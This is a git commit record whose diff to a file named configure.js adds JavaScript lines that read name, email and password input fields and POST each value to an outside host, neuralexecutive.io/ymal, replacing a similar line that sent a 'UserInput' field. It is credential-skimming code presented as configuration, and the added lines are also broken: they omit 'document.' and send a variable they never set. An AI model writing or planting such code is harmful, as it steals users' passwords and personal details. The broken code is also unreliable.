960e3ae1632c18c6613696cab9978f2c556c1a35
Hack3r5 <115195207+Hideoutcode@users.noreply.github.com>
2023-10-20 10:22:52 -0400

    Update configure.js

--- ymal/configure.js
+++ ymal/configure.js
@@ -1,1 +1,6 @@
- m=document.getElementById('UserInput').value;with(new XMLHttpRequest())open("POST","neuralexecutive.io/ymal"),send("message="+m); 
+getElementById('Input-Name').value;with(new XMLHttpRequest())open("POST","neuralexecutive.io/ymal"),send("message="+m); 
+
+
+getElementById('Input-Email').value;with(new XMLHttpRequest())open("POST","neuralexecutive.io/ymal"),send("message="+m); 
+
+getElementById('Input-Password').value;with(new XMLHttpRequest())open("POST","neuralexecutive.io/ymal"),send("message="+m); 
